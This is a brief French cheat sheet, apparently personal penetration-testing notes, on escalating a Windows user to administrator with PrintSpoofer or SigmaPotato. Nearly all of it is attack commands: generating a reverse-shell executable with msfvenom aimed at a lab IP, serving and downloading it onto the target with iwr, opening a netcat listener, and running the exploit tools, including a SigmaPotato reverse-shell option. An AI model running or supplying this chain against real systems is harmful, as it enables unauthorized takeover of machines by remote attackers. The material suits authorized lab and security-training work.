Si un utilisateur à ce privilege, il peut devenir Administrateur par PrintSpoofer :

# Printspoofer
## Generer un reverse shell avec msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.213 LPORT=405 -f exe > r405.exe
```
## Demare un serveur Python pour télécharger le reverse shell
```powershell
python3 -m uploadserver 8080
```
## Telecharge sur la cible
```powershell
iwr -uri http://192.168.45.213:8080/r405.exe -Outfile r405.exe
```
## Telecharger sur la cible Printspoofer
```powershell
iwr -uri http://192.168.45.213/PrintSpoofer64.exe -Outfile psf.exe
```
## Demarer un terminal Netcat sur Kali
```powershell
rlwrap nc -lnvp 405
```
## Lancer printspoofer 
```powershell
.\psf -i -c r405.exe
```

Si Printspoofer ne marche pas ==> SigmaPotato
# SigmaPotato
https://github.com/tylerdotrar/SigmaPotato
```
# Execute a Command
./SigmaPotato.exe <command>

# Establish a PowerShell Reverse Shell
./SigmaPotato.exe --revshell <ip_addr> <port>

# Return Help Information
./SigmaPotato.exe --help
```